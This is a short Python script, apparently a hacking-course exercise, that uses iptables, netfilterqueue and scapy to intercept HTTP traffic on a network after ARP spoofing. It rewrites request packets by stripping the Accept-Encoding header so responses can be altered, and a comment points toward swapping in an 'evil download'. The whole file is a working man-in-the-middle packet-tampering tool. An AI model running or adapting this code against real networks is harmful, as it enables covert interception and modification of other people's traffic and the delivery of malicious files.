#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import subprocess
import re

def set_load(s_packet, load):
    """Modifies the load of the scapy packet passed to the load"""

    # New link to the evil download
    s_packet[scapy.Raw].load = load
    del s_packet[scapy.IP].len
    del s_packet[scapy.IP].chksum
    del s_packet[scapy.TCP].chksum

    return s_packet


def process_packet(packet):
    """When a packet arrives this function is called"""

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request packet")
            print(scapy_packet.show())
            print("load: \n" + str(scapy_packet[scapy.Raw].load) + "\n")

            new_load = re.sub("Accept-Encoding:", "LOLOLOLO", str(scapy_packet[scapy.Raw].load))
            print("NEW LOAD: \n" + new_load)
            mod_packet = set_load(scapy_packet, new_load)

            print("Final packet:")
            print(mod_packet.show())

            packet.set_payload(bytes(mod_packet))
            #print("New modified packet: ")


        elif scapy_packet[scapy.TCP].sport == 80:
            #print("[+] Response packet")
            #print(scapy_packet.show())
            pass
    packet.accept()


try:
    # Execute first the arp spoofer
    # To test with this computer: iptables -I OUTPUT -j NFQUEUE --queue-num 0;
    #                             iptables -I INPUT -j NFQUEUE --queue-num 0;
    # trap the incoming packets to a queue that come from other computers while mitm:
    # iptables -I FORDWARD -j queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0;", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

    # Remember to delete iptables wih iptables --flush
except KeyboardInterrupt:
    print("closing dns spoofer")
    subprocess.call("iptables --flush", shell=True)